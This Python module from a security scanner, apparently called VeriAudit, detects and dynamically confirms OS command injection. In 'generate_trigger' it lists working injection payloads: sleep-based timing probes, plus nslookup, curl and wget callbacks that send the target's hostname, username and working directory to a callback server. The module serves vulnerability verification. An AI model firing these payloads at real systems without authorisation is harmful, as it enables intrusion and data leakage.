# VeriAudit - Command Injection Handler
from __future__ import annotations

import time
from typing import Any, Dict, List

from veriaudit.core.schema import Finding, JudgeRule, FindingStatus

from ..base import VulnerabilityClassHandler


class CommandInjectionHandler(VulnerabilityClassHandler):
    """
    Handles OS command injection (CWE-77, CWE-78).
    Applicable to ALL languages.
    """

    @property
    def vuln_class_name(self) -> str:
        return "command-injection"

    @property
    def cwe_ids(self) -> List[str]:
        return ["CWE-77", "CWE-78"]

    @property
    def applicable_languages(self) -> List[str]:
        return ["all"]

    def get_discovery_rules(self, language: str) -> List[Dict[str, Any]]:
        rules = []

        lang_rules = {
            "php": [
                {"tool": "semgrep", "rule": "php-command-injection"},
                {"tool": "codeql", "rule": "php/command-injection"},
            ],
            "python": [
                {"tool": "semgrep", "rule": "python-command-injection"},
                {"tool": "bandit", "rule": "B603"},
                {"tool": "bandit", "rule": "B604"},
                {"tool": "bandit", "rule": "B605"},
            ],
            "go": [
                {"tool": "semgrep", "rule": "go-command-injection"},
                {"tool": "codeql", "rule": "go/command-injection"},
            ],
            "java": [
                {"tool": "semgrep", "rule": "java-command-injection"},
                {"tool": "codeql", "rule": "java/command-injection"},
            ],
            "javascript": [
                {"tool": "semgrep", "rule": "javascript-command-injection"},
                {"tool": "codeql", "rule": "js/command-injection"},
            ],
            "ruby": [
                {"tool": "semgrep", "rule": "ruby-command-injection"},
                {"tool": "codeql", "rule": "ruby/command-injection"},
            ],
            "c": [
                {"tool": "semgrep", "rule": "c-command-injection"},
                {"tool": "codeql", "rule": "cpp/command-injection"},
            ],
        }

        rules.extend(lang_rules.get(language.lower(), [
            {"tool": "semgrep", "rule": f"{language.lower()}-command-injection"},
        ]))

        return rules

    def generate_trigger(self, finding: Finding,
                          context: Dict[str, Any]) -> Dict[str, Any]:
        """Generate command injection payloads: timing + DNS callback + HTTP callback."""

        callback_domain = context.get("callback_domain", "veriaudit-callback.local")
        callback_url = context.get("callback_url", f"http://{callback_domain}:8080")

        payloads = [
            # Timing-based (fastest screening)
            {"type": "timing", "payload": "$(sleep 5)",
             "description": "Subshell sleep 5 seconds"},
            {"type": "timing", "payload": "`sleep 5`",
             "description": "Backtick sleep 5 seconds"},
            {"type": "timing", "payload": "; sleep 5",
             "description": "Semicolon sleep 5 seconds"},

            # DNS callback (more reliable than timing)
            {"type": "dns_callback",
             "payload": f"$(nslookup $(hostname).{callback_domain})",
             "description": "DNS lookup with hostname to callback domain"},
            {"type": "dns_callback",
             "payload": f"`nslookup $(whoami).{callback_domain}`",
             "description": "DNS lookup with username to callback domain"},

            # HTTP callback (most reliable, may be blocked by firewall)
            {"type": "http_callback",
             "payload": f"$(curl -s {callback_url}/$(whoami)/$(pwd))",
             "description": "HTTP request with env info to callback server"},
            {"type": "http_callback",
             "payload": f"`wget -qO- {callback_url}/cmd_inject`",
             "description": "wget request to callback server"},
        ]

        return {
            "trigger_type": "injection_payloads",
            "vulnerability_type": "command-injection",
            "injection_point": context.get("injection_point", ""),
            "param_name": context.get("param_name", ""),
            "payloads": payloads,
        }

    def verify_dynamically(self, finding: Finding,
                            trigger: Dict[str, Any],
                            context: Dict[str, Any]) -> Dict[str, Any]:
        """
        Dynamic verification of command injection.
        Strategy:
          1. Try timing payloads first — measure response time
          2. Try DNS callbacks — check if callback server received request
          3. Try HTTP callbacks — check callback server logs
        """
        import httpx

        target_url = context.get("target_url", "")
        injection_point = trigger.get("injection_point", "")
        callback_domain = context.get("callback_domain", "")
        callback_url = context.get("callback_url", "")
        payloads = trigger.get("payloads", [])

        results = {
            "confirmed": False,
            "method": "",
            "evidence": {},
            "payloads_tried": 0,
        }

        if not target_url:
            results["error"] = "No target URL provided"
            return results

        client = httpx.Client(timeout=15)

        for payload_info in payloads:
            payload = payload_info["payload"]
            ptype = payload_info["type"]
            results["payloads_tried"] += 1

            try:
                if ptype == "timing":
                    start = time.time()
                    self._send_payload(client, target_url, injection_point, payload)
                    elapsed = time.time() - start
                    if elapsed > 4.5:  # sleep 5 should take > 4.5s
                        results["confirmed"] = True
                        results["method"] = "timing"
                        results["evidence"] = {
                            "observed_delay": elapsed,
                            "expected_delay": 5,
                            "payload": payload,
                        }
                        return results

                elif ptype == "dns_callback":
                    # Check callback server for DNS query
                    self._send_payload(client, target_url, injection_point, payload)
                    time.sleep(2)  # Wait for DNS propagation
                    dns_hit = self._check_callback_dns(callback_url, callback_domain)
                    if dns_hit:
                        results["confirmed"] = True
                        results["method"] = "dns_callback"
                        results["evidence"] = {
                            "oob_callback_received": True,
                            "callback_type": "dns",
                            "payload": payload,
                        }
                        return results

                elif ptype == "http_callback":
                    self._send_payload(client, target_url, injection_point, payload)
                    time.sleep(2)
                    http_hit = self._check_callback_http(callback_url)
                    if http_hit:
                        results["confirmed"] = True
                        results["method"] = "http_callback"
                        results["evidence"] = {
                            "oob_callback_received": True,
                            "callback_type": "http",
                            "payload": payload,
                        }
                        return results

            except Exception:
                continue

        client.close()
        return results

    def _send_payload(self, client, target_url: str,
                       injection_point: str, payload: str):
        """Inject payload into the target."""
        url = target_url.replace("{{PAYLOAD}}", payload)
        try:
            client.get(url)
        except Exception:
            pass

    def _check_callback_dns(self, callback_url: str, domain: str) -> bool:
        """Check if callback server received DNS queries."""
        try:
            import httpx
            resp = httpx.get(f"{callback_url}/api/dns_queries?domain={domain}", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return len(data.get("queries", [])) > 0
        except Exception:
            pass
        return False

    def _check_callback_http(self, callback_url: str) -> bool:
        """Check if callback server received HTTP requests."""
        try:
            import httpx
            resp = httpx.get(f"{callback_url}/api/recent_requests", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return len(data.get("requests", [])) > 0
        except Exception:
            pass
        return False

    def get_judge_rules(self) -> List[JudgeRule]:
        return [
            JudgeRule(rule_id="CMDI-R001", condition="OOB DNS/HTTP callback received",
                      verdict=FindingStatus.CONFIRMED_EXPLOITED, confidence=0.95, priority=1),
            JudgeRule(rule_id="CMDI-R002", condition="Timing injection > 4.5s for SLEEP(5)",
                      verdict=FindingStatus.CONFIRMED_EXPLOITED, confidence=0.90, priority=2),
        ]
